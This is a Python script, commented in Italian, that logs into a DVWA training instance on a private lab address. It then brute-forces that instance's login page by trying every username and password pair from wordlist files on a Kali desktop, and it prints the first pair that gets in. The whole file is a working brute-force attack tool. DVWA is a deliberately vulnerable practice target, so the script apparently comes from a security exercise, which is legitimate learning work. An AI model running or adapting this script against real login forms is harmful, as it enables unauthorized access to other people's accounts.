import requests
import os
import sys
from bs4 import BeautifulSoup

# URL di login
login_url = "http://192.168.50.101/dvwa/login.php"

# Menu di selezione del livello di sicurezza
print("Seleziona il livello di sicurezza:")
print("1. Low")
print("2. Medium")
print("3. High")

# Chiede all'utente di selezionare un'opzione
choice = input("Inserisci il numero corrispondente al livello di sicurezza desiderato: ").strip()

# Mappa la scelta dell'utente al livello di sicurezza
security_levels = {
    "1": "low",
    "2": "medium",
    "3": "high",
}

# Verifica se la scelta dell'utente e' valida
if choice not in security_levels:
    print("Scelta non valida. Inserisci un numero valido.")
    os.execl(sys.executable, sys.executable, *sys.argv)

# Ottiene il livello di sicurezza corrispondente alla scelta dell'utente
security_level = security_levels[choice]


# Dati di login
login_payload = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

# Esegue la richiesta di login per ottenere il PHPSESSID
login_response = requests.post(login_url, data=login_payload)

# Verifica che il login sia andato a buon fine
if "Login failed" in login_response.text:
    print("Errore durante il login. Potrebbe essere necessario fornire credenziali valide.")
    exit()

# Estrae il PHPSESSID dal cookie della risposta di login
phpsessid_cookie = login_response.request.headers.get('Cookie').split('; ')[1].split('=')[1]

# Stampa il PHPSESSID a schermo
print(f"\033[1mPHPSESSID\033[0m ottenuto con successo: {phpsessid_cookie}\n")

# Costruisce l'header con il PHPSESSID e il livello di sicurezza
header = {"Cookie": f"security={security_level}; PHPSESSID={phpsessid_cookie}"}

# Legge i nomi utente e le password dai file
usernames_file_path = "/home/kali/Desktop/username.lst"
passwords_file_path = "/home/kali/Desktop/password.lst"

with open(usernames_file_path, 'r') as usernames_file, open(passwords_file_path, 'r') as passwords_file:
    usernames = usernames_file.readlines()
    passwords = passwords_file.readlines()

# Itera sui nomi utente e password
for user in usernames:
    for password in passwords:
        url = "http://192.168.50.101/dvwa/vulnerabilities/brute/"
        users = user.strip()
        passw = password.strip()
        get_data = {"username": users, "password": passw, "Login": 'Login'}
        print("\033[1mUtente:\033[0m", user,"\033[1mPassword: \033[0m", passw, "\n")
        
        # Stampa il PHPSESSID prima di eseguire la richiesta successiva
        print(f"\033[1mPHPSESSID\033[0m utilizzato nella richiesta: {phpsessid_cookie}\n")

        r = requests.get(url, params=get_data, headers=header)
        if not 'Username and/or password incorrect.' in r.text:
            print("\nAccesso riuscito con: \nUsername:\033[1m", users, "\033[0m- Password:\033[1m", passw,"\033[0m")
            exit()
